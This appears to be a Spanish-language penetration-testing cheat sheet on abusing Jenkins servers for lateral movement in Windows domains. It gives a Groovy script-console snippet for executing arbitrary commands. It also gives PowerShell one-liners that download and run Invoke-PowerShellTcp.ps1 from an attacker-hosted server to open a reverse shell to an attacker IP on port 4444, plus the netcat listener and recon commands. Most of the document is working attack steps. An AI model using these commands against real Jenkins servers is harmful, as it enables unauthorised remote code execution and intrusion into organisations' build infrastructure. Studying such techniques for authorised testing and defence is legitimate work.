# Feature Abuse 

Tags: #AD #Windows #Jenkins #MovimientoLateral  

## Abusar de la app 'Jenkins' 

```bash 
Si hay una versión antigua es probable que sea una aplicación vulnerable. El servidor Jenkins es ejecutado en el puerto '8080' 

Aparte de numerosos plugins, hay dos maneras de ejecutar comandos en un 'Jenkins Master'
Existen usuarios conocidos como: 'builduser, manager, jenkinsadmin'
```

## Forma 1 - Jenkins Master

```powershell 
Si se tiene acceso 'Admin' la cual viene instalada en las versiones <2.x 
❯ http://<jenkins_server>/script 

En la consola, Groovy scripts pueden ser ejecutados los siguientes comandos:

	def sout = new StringBuffer(), serr = new StringBuffer()
	def proc = '[INSERT COMMAND]'.execute()
	proc.consumeProcessOutput(sout, serr)
	proc.waitForOrkill(1000)
	println "out> $sout err> $serr"
```

## Forma 2 - Jenkins Master

```powershell 
1. Se debe tener credenciales validas para acceder al 'login'
Si no se tiene permisos de 'Admin' pero se puede agregar o editar 'build steps' en la pestaña 'Source Code Management' de la configuración.

2. Mirar si se esta en un 'Jenkins Master' mirando la parte de 'Buil Executor Status' donde si aparece 'Built-In Node' significa que si lo es 

3. Ir a algún proyecto en verde, luego a 'Configure > Add build step > Execute Windows batch command'. Se puede descargar, ejecutar scripts, correr scripts encodeados y más 


4. Descargar, guardar el script para crear una Revershell en Jenkins.
❯ powershell iex (iwr -UseBasicParsing http://IP/Invoke-PowerShellTcp.ps1);power -Reverse -IPAddress IP_Atacante -Port 4444    
❯ powershell.exe iex (iwr http://IP/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress IP_Atacante -Port 4444

❯ nc64.exe -nlvp 4444     # Recibir la ReverShell en la máquina de atacante Windows 
	❯ $env:username       # Mirar el usuario actual en powershell 
	❯ $env:computername   # Mirar el nombre del computador (server)
	❯ ls env:             # Mirar los detalles del server 


Notas:
	1. Para compartir el script de 'Invoke-PowerShelTcp.ps1' se puede ejecutar en la máquina de atacante Windows el programa de 'hfs.exe' que permite compartir archivos 
	2. Dar click en 'Build now' cuando ya se tenga el comando de escucha y el script compartido con 'hfs'
```
